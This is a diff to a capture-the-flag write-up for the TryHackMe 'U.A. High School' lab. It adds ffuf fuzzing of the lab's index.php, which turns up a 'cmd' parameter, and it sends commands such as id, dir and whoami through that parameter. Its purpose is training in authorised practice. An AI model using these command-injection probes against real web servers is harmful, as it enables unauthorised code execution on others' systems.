@@ -30,29 +30,49 @@ Directories traversal:
 - /assets/
   - /assets/index.php
 
+Let's check for command injection vulnerability, first we'll install a tool `fuff` and for that you need to have `go` cli tool installed. To install `fuff` run the following command
+
 ```
-$ dirsearch -u http://10.10.183.152/assets/index.php
-
-
-  _|. _ _  _  _  _ _|_    v0.4.3
- (_||| _) (/_(_|| (_| )
-
-Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
-
-Output File: /media/hamza/DATA/USB-LINUX-DATA/Documents/TryHackMe/U.A. High School/dirsearch_results/reports/http_10.10.183.152/_assets_index.php_24-09-27_21-28-12.txt
-
-Target: http://10.10.183.152/
-
-[21:28:12] Starting: assets/index.php/
-[21:28:19] 404 -  275B  - /assets/index.php/%2e%2e//google.com
-[21:31:26] 200 -   40B  - /assets/index.php/p_/webdav/xmltools/minidom/xml/sax/saxutils/os/popen2?cmd=dir
-
-Task Completed
+$ go install github.com/ffuf/ffuf/v2@latest
 ```
 
-Command Injection:
+Now let's also get some wordlists:
 
-Url `http://10.10.183.152/assets/index.php` contains command injection vulnerability.
+```
+$ git clone https://github.com/danielmiessler/SecLists.git
+```
+
+Now that we have everything, let's run the tool:
+
+```
+$~/go/bin/ffuf -u 'http://10.10.216.120/assets/index.php?FUZZ=id' -mc all -ic -t 100 -w /home/hamza/Utilities/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -fs 0
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.216.120/assets/index.php?FUZZ=id
+ :: Wordlist         : FUZZ: /home/hamza/Utilities/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 100
+ :: Matcher          : Response status: all
+ :: Filter           : Response size: 0
+________________________________________________
+
+cmd                     [Status: 200, Size: 72, Words: 1, Lines: 1, Duration: 508ms]
+:: Progress: [38267/38267] :: Job [1/1] :: 195 req/sec :: Duration: [0:03:16] :: Errors: 0 ::
+```
+
+Hence, url `http://10.10.183.152/assets/index.php` contains command injection vulnerability, bu passing command in the `cmd` param in the url. 
 
 Try getting response of a command, example `whoami`:
 
@@ -265,3 +285,5 @@ deku@myheroacademia:~$ ls -l /opt/NewComponent/feedback.sh
 -r-xr-xr-x 1 deku deku 684 Jan 23  2024 /opt/NewComponent/feedback.sh
 
 ```
+
+
